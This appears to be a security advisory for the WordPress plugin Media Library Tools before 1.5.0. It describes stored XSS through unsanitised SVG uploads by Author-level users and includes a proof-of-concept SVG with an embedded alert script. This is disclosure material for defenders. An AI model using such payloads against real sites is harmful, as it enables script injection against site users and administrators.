## WordPress Plugin Vulnerabilities

# Media Library Tools < 1.5.0 - Author+ Stored XSS via SVG

### Description

The plugin does not sanitise uploaded SVG files, which could allow users with a role as low as Author to upload a malicious SVG containing XSS payloads.

### Proof of Concept

1. As an admin, enable SVG support.
2. Once that is enabled, there are no further checks on SVG files and authors and above can upload them.
As an author, upload an SVG with the payload:
<svg xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">alert("xss");</script>
</svg>
View the SVG and see the XSS.
